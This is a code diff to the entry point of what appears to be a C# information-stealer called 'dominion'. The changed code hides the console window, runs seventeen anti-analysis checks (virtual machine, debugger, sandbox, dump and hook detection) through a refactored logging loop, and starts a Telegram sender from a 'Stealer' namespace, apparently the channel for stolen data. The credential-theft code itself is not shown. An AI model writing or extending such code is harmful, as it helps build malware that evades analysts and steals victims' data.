@@ -1,14 +1,17 @@
 ﻿using System;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+
 using dominion.src.dominion.Stealer.General;
 using dominion.src.dominion.configuration;
 using dominion.src.dominion.Security;
+using dominion.src.dominion.Dependencies.Data;
 
 namespace dominion.src
 {
     internal class Entry
     {
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -20,18 +23,21 @@ namespace dominion.src
 
         public static void Run()
         {
-            if (!configuration.DebugMode)
+            if (!Configuration.DebugMode)
             {
                 var handle = GetConsoleWindow();
                 ShowWindow(handle, SW_HIDE);
             }
 
-            if (configuration.EnableSecurityChecks)
+            if (Configuration.EnableSecurityChecks)
             {
                 RunSecurityChecks();
             }
 
-            LogSucess("Successfully initialized src's Entry.cs");
+            LogSucess("Successfully initialized Src.Entry.cs");
+            LogSucess("Successfully initialized Src.Dominion.Configuration.Configuration.cs");
+            LogSucess("Successfully initialized Src.Dominion.Dependencies.Data.InMemmoryZip.cs");
+            LogSucess("Successfully initialized Src.Dominion.Dependencies.Data.Paths.cs");
 
             try
             {
@@ -40,7 +46,7 @@ namespace dominion.src
             catch (Exception ex)
             {
                 Console.Beep();
-                LogError("Initializing telegram had an issue: " + ex.Message);
+                LogError("Issue with initializing telegram: " + ex.Message);
                 Console.WriteLine(ex);
             }
 
@@ -49,27 +55,43 @@ namespace dominion.src
 
         private static void RunSecurityChecks()
         {
-            AntiVm.Execute();
-            DetectDebugger.Run();
-            AntiInjectionCheck.RunChecks();
-            BehavioralAnomalyCheck.RunChecks();
-            DetectAnalysisTools.Run();
-            DetectAnyrunMac.Run();
-            DetectEnvironmentVariables.Run();
-            DetectHarmonyPatch.Run();
-            DetectILDasm.Run();
-            DetectInlineHook.Run();
-            DetectMemoryPatching.Run();
-            DetectRemoteDebugger.Run();
-            DetectSandbox.Run();
-            DetectTimingAnalysis.Run();
-            PreventDump.Run();
-            ProcessNameCheck.RunChecks();
-            AntiDumpSectionScramble.Run();
+            string[] securityModules = {
+                "AntiVm.cs", "DetectDebugger.cs", "AntiInjectionCheck.cs", "BehavioralAnomalyCheck.cs",
+                "DetectAnalysisTools.cs", "DetectAnyrunMac.cs", "DetectEnvironmentVariables.cs", "DetectHarmonyPatch.cs",
+                "DetectILDasm.cs", "DetectInlineHook.cs", "DetectMemoryPatching.cs", "DetectRemoteDebugger.cs",
+                "DetectSandbox.cs", "DetectTimingAnalysis.cs", "PreventDump.cs", "ProcessNameCheck.cs", "AntiDumpSectionScramble.cs"
+            };
+
+            Action[] securityActions = {
+                () => AntiVm.Execute(),
+                () => DetectDebugger.Run(),
+                () => AntiInjectionCheck.RunChecks(),
+                () => BehavioralAnomalyCheck.RunChecks(),
+                () => DetectAnalysisTools.Run(),
+                () => DetectAnyrunMac.Run(),
+                () => DetectEnvironmentVariables.Run(),
+                () => DetectHarmonyPatch.Run(),
+                () => DetectILDasm.Run(),
+                () => DetectInlineHook.Run(),
+                () => DetectMemoryPatching.Run(),
+                () => DetectRemoteDebugger.Run(),
+                () => DetectSandbox.Run(),
+                () => DetectTimingAnalysis.Run(),
+                () => PreventDump.Run(),
+                () => ProcessNameCheck.RunChecks(),
+                () => AntiDumpSectionScramble.Run()
+            };
+
+            for (int i = 0; i < securityModules.Length; i++)
+            {
+                Log($"Initializing {securityModules[i]}");
+                securityActions[i]();
+            }
         }
 
         private static async Task SendMessage()
         {
+            LogSucess("Successfully initialized Src.Dominion.Stealer.General.Sender.cs");
             using (var sender = new Sender())
             {
                 await sender.SendHelloMessage();
